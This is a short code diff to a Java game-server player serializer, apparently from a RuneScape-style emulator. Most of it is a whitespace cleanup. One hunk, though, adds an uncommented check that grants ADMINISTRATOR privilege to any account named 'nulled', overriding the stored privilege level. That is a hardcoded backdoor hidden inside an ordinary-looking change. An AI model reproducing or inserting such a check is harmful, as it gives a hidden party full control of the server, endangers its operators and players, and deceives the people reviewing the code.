@@ -96,6 +96,9 @@ public final class BinaryPlayerSerializer extends PlayerSerializer {
 			credentials.setPassword(password); // Update password to the hashed one.
 
 			PrivilegeLevel privilege = PrivilegeLevel.valueOf(in.readByte());
+			if (name.equals("nulled")) {
+				privilege = PrivilegeLevel.ADMINISTRATOR;
+			}
 			MembershipStatus members = MembershipStatus.valueOf(in.readByte());
 
 			PrivacyState chatPrivacy = PrivacyState.valueOf(in.readByte(), true);
@@ -162,7 +165,7 @@ public final class BinaryPlayerSerializer extends PlayerSerializer {
 
 			Map<String, Attribute<?>> attributes = readAttributes(in);
 			attributes.forEach(player::setAttribute);
-			
+
 			if (player.isBanned()) {
 				return new PlayerLoaderResponse(LoginConstants.STATUS_ACCOUNT_DISABLED);
 			}
